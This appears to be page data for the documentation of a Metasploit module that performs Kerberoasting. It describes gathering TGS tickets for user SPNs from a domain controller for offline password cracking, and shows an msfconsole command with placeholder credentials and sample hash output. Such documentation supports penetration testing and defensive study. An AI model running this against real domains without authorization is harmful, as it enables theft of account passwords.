{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/get_user_spns","result":{"data":{"moduleMetadataJson":{"id":"74b9a311-fa89-587c-933e-8050ae3d76d6","name":"Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)","fullname":"auxiliary/gather/get_user_spns","description":"This module will try to find Service Principal Names that are associated with normal user accounts.\n        Since normal accounts' passwords tend to be shorter than machine accounts, and knowing that a TGS request\n        will encrypt the ticket with the account the SPN is running under, this could be used for an offline\n        bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.\n        This is part of the kerberoast attack research by Tim Medin (@timmedin).","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/get_user_spns","documentationSlug":"/modules/documentation/auxiliary/gather/get_user_spns"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module will try to find Service Principal Names (SPN) that are associated with normal user accounts on the specified domain and then submit requests to retrive Ticket Granting Service (TGS) tickets for those accounts, which may be partially encrypted with the SPNs NTLM hash. After retrieving the TGS tickets, offline brute forcing attacks can be performed to retrieve the passwords for the SPN accounts.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To avoid library/version conflict, it would be useful to have a pipenv virtual environment.</p>\n<ul>\n<li><code class=\"language-text\">pipenv --two &amp;&amp; pipenv shell</code></li>\n<li>Follow the <a href=\"https://github.com/CoreSecurity/impacket#installing\">impacket installation steps</a> to install the required libraries.</li>\n<li>Have a domain user account credentials</li>\n<li><code class=\"language-text\">./msfconsole -q -x &#39;use auxiliary/gather/get_user_spns; set rhosts &lt;dc-ip&gt; ; set smbuser &lt;user&gt; ; set smbpass &lt;password&gt; ; set smbdomain &lt;domain&gt; ; run&#39;</code></li>\n<li>Get Hashes</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfconsole -q -x &#39;use auxiliary/gather/get_user_spns; set rhosts &lt;dc-ip&gt; ; set smbuser &lt;user&gt; ; set smbpass &lt;password&gt; ; set smbdomain &lt;domain&gt; ; run&#39;\nrhosts =&gt; &lt;dc-ip&gt;\nsmbuser =&gt; &lt;user&gt;\nsmbpass =&gt; &lt;password&gt;\nsmbdomain =&gt; &lt;domain&gt;\n[*] Running for &lt;domain&gt;...\n[*] Total of records returned &lt;num&gt;\n[+] ServicePrincipalName                              Name        MemberOf                                                                          PasswordLastSet      LastLogon           \n[+] ------------------------------------------------  ----------  --------------------------------------------------------------------------------  -------------------  -------------------\n[+] SPN...              User...   List...  DateTime... Time... \n[+] $krb5tgs$23$*user$realm$test/spn*$&lt;data&gt;\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"74b9a311-fa89-587c-933e-8050ae3d76d6"}}}